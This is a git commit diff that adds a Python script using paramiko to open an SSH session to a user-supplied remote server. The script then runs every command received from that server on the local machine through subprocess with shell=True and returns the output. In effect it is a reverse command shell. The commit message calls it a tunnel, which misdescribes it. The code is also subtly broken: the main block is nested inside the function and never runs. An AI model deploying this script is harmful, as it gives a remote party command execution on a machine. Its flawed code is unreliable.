bb1672f7c3970a64bdde17817944c246316e39f6
PeanutSoup55 <ericblanchette55hockey@gmail.com>
2025-02-18 15:58:31 -0500

    added reverse_forward_tunnel to file

--- ssh_rcmd.py
+++ ssh_rcmd.py
@@ -2,8 +2,32 @@ import paramiko
 import shlex
 import subprocess
 
-def ssh_command(ip, port, user, password, command){
+def ssh_command(ip, port, user, password, command):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     client.connect(ip, port=port, username=user, password=password)
-}
+
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.send(command)
+        print(ssh_session.recv(1024).decode())
+        while True:
+            command = ssh_session.recv(1024)
+            try:
+                cmd = command.decode()
+                if cmd == 'exit':
+                    client.close()
+                    break
+                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
+                ssh_session.send(cmd_output or 'okay')
+            except Exception as e:
+                ssh_session.send(str(e))
+        client.close()
+        return
+    if __name__ == '__main__':
+        import getpass
+        user = getpass.getuser()
+        password = getpass.getpass()
+        ip = input("Enter the IP address of the remote server: ")
+        port = input("Enter the port number: ")
+        ssh_command(ip, port, user, password, 'ClientConnected')
